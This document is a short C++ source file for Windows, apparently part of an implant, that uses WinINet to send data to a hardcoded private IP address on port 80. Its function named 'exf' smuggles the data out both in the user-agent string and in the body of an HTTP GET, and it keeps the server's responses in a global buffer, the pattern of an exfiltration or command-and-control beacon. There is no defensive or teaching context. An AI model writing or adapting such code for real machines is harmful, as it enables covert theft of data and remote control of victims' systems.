#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <cstdio>
#include <memory>
#include <array>
#include <stdexcept>
#include <string>
#include <vector>
#include <bitset>
#include <cstring>
#include <cstdlib>

#pragma comment(lib, "wininet.lib")

std::string globalData;
char str_ [] = "hello";

// Function to initialize the Internet connection
HINTERNET InitializeInternet(const char* agent) {
    HINTERNET hInternet = InternetOpen(agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "InternetOpen failed: " << GetLastError() << std::endl;
    }
    return hInternet;
}

// Function to connect to the server
HINTERNET ConnectToServer(HINTERNET hInternet, const char* serverAddress, int port) {
    HINTERNET hConnect = InternetConnect(hInternet, serverAddress, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        std::cerr << "InternetConnect failed: " << GetLastError() << std::endl;
    }
    return hConnect;
}

// Function to send a request and read the response
bool SendRequest(HINTERNET hConnect, const char* endpoint, const char* message) {
    HINTERNET hRequest = HttpOpenRequest(hConnect, "GET", endpoint, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        std::cerr << "HttpOpenRequest failed: " << GetLastError() << std::endl;
        return false;
    }

    // Send the request
    if (!HttpSendRequest(hRequest, NULL, 0, (LPVOID)message, strlen(message))) {
        std::cerr << "HttpSendRequest failed: " << GetLastError() << std::endl;
        InternetCloseHandle(hRequest);
        return false;
    }

    // Read the response
    char buffer[1024];
    DWORD bytesRead;
    while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        //std::cout << buffer;
        globalData.append(buffer, bytesRead);
    }

    InternetCloseHandle(hRequest);
    return true;
}
int exf(const char* str_){
    // Initialize Internet
    HINTERNET hInternet = InitializeInternet(str_);
    if (!hInternet) return 1;

    // Connect to the server
    HINTERNET hConnect = ConnectToServer(hInternet, "192.168.105.128", 80);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Send "hello" message to the server
    if (!SendRequest(hConnect, "/", str_)) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Clean up
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return 1;
}